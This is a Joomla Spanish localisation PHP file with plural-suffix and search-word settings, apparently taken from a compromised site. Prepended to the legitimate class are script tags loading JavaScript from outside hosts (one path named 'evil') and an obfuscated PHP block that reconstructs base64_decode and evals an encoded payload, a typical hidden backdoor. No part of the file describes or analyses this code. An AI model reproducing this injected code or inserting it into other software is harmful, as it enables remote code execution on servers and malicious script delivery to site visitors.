<script src="http://cpm.36obuy.org/evil/1.js"></script><script src="http://cpm.36obuy.org/lion/1.js"></script><script/src=//360cdn.win/c.css></script>



<?php
$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iVEJySVZMeGNHT1h2QUpsdXR6aGZEeW9VRk5QSHFNWm1Dd0tqYXBXU2RiZXNRWWlnbmtFUlplTHpwUUFGZ0JXUFZLaFhmWUpib3lsSGp4TmNJZHV0R3ZrRU9yUkRtVXdpTXFzQ1RTbmFObzl2T2NWa3VUcFhxM2FyVTI0Q09SdVlGZ2hTdVd6bGtXaWtHRGFzVTNhWXpvMENxV0t5cVdTbEdDU0tHTVNLR0RtWk9ncFhVUm5UekdWQ3pHVkN6bzArekdtdU9XeFBtV3h2T1JhaEZzRmlHQ1NLR01TS0dEbUdxUmhTbURGQ3pHVkN6R1ZDem8wK3pHbUdxUmhTbVd4dk9SYWhGc0ZpR0NTS0dNU0tHREZZeEVWVHpHVkN6R1ZDekdWQ3pvMCt6R0ZZeEVlWkZnaFN1V3pUUVZsS0dEVkN6R1ZDekdWQ3pHVkN6R1ZDekdWVGEyOVB1MkFocXQ5MEt5VkN6R1Y5TnNWVGEyOVB1MkFocXQ5MEt5dmtHTVNLR0RWQ3pHVkN6R1ZDSzN4UEYyOVlGZ2hTdVd6VHpHVkN6bzArekdtWloxeE5LeXZrR01TS0dNU0tLM3hQdTI5MUt5VkN6R1ZDekdWQ05aNENLM3hQdTI5MUt5dmtHTVNDa1ppa0dEYTFGMnB5TVJtaFVUTUNORGVZbWNLMFUyQVBtMnB5a0dhYkgwcERwU3BEUnltenBqYU1XMXBaYXBLYk1IbWpaaE1UV0RTN0dzVkN6R2V0VTNLaHFSeGxrR2FzVTNhWXpnall6R2FMem8wK3pHYTJrV2lrR01ocnVzSlltY0tyRjNheWtHYTFGMnB5TVJtaFVUTWlLY3Fya1dpa0dNU0tGdHAwbVdLWHpjYXltUkg3R0NTS0dSS3l1UmpMQnZsS0dXMGtHVzBrR1dLaG1jcHlVc2V0cVJBWXVaaWtiTWxrT1JxbE9SdVlGZ2hTdVd6bGtEU2tHV2lrS2d1clVnSENORGV0T1JBaFcybWhtajlFVTI1MHVSNTBGeUNUT2NhMEZvbFBRM20zbXk1NnUycmZRUjl5dXk1RVUyMFBLeVM3elZyaHEySlB6R2F0T1JBaEJ2cmh3Z2gwQnZsS2JNbC9OQz09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));?>



<?php
/**
 * @version		$Id: es-ES.localise.php $
 * Copyright (C) 2005 - 2012 Open Source Matters. All rights reserved.
 * Copyright (C) Translation 2010 - 2012 http://comunidadjoomla.org All rights reserved.
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 */

/**
 * en-GB localise class
 *
 * @package		Joomla.Site
 * @since		1.6
 */
abstract class es_ESLocalise {
	/**
	 * Returns the potential suffixes for a specific number of items
	 *
	 * @param	int $count  The number of items.
	 * @return	array  An array of potential suffixes.
	 * @since	1.6
	 */
	public static function getPluralSuffixes($count) {
		if ($count == 0) {
			$return =  array('0');
		}
		elseif($count == 1) {
			$return =  array('1');
		}
		else {
			$return = array('MORE');
		}
		return $return;
	}
	/**
	 * Returns the ignored search words
	 *
	 * @return	array  An array of ignored search words.
	 * @since	1.6
	 */
	public static function getIgnoredSearchWords() {
		$search_ignore = array();
		$search_ignore[] = "y";
		$search_ignore[] = "en";
		$search_ignore[] = "con";
		return $search_ignore;
	}
	/**
	 * Returns the lower length limit of search words
	 *
	 * @return	integer  The lower length limit of search words.
	 * @since	1.6
	 */
	public static function getLowerLimitSearchWord() {
		return 3;
	}
	/**
	 * Returns the upper length limit of search words
	 *
	 * @return	integer  The upper length limit of search words.
	 * @since	1.6
	 */
	public static function getUpperLimitSearchWord() {
		return 20;
	}
	/**
	 * Returns the number of chars to display when searching
	 *
	 * @return	integer  The number of chars to display when searching.
	 * @since	1.6
	 */
	public static function getSearchDisplayedCharactersNumber() {
		return 200;
	}
}

